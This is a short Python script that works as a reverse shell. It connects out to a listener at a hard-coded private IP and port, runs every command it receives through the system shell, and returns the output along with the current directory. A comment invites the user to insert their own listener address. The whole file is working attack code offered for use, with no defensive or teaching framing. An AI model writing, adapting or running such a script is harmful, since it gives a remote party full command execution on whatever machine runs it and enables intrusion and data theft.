import socket
import subprocess
import os

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.1.19", 6969))  # Replace "listener_ip" and listener_port with the IP address and port of your listener

    while True:
        command = s.recv(1024).decode()
        if 'terminate' in command:
            s.close()
            break
        else:
            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))

def main():
    connect()

if __name__ == "__main__":
    main()
